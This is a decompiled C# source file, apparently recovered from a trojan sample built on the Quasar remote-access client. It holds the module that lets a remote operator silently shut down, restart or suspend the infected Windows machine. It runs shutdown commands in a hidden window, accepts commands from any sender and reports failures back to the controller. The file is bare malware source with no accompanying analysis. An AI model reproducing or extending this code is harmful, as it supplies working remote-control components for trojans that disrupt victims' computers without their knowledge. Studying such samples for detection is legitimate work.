// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.ShutdownHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
  public class ShutdownHandler : IMessageProcessor
  {
    public bool CanExecute(IMessage message) => message is DoShutdownAction;

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      if (!(message is DoShutdownAction message1))
        return;
      this.Execute(sender, message1);
    }

    private void Execute(ISender client, DoShutdownAction message)
    {
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        switch (message.Action)
        {
          case ShutdownAction.Shutdown:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.UseShellExecute = true;
            startInfo.Arguments = "/s /t 0";
            startInfo.FileName = "shutdown";
            Process.Start(startInfo);
            break;
          case ShutdownAction.Restart:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.UseShellExecute = true;
            startInfo.Arguments = "/r /t 0";
            startInfo.FileName = "shutdown";
            Process.Start(startInfo);
            break;
          case ShutdownAction.Standby:
            Application.SetSuspendState(PowerState.Suspend, true, true);
            break;
        }
      }
      catch (Exception ex)
      {
        client.Send<SetStatus>(new SetStatus()
        {
          Message = "Action failed: " + ex.Message
        });
      }
    }
  }
}
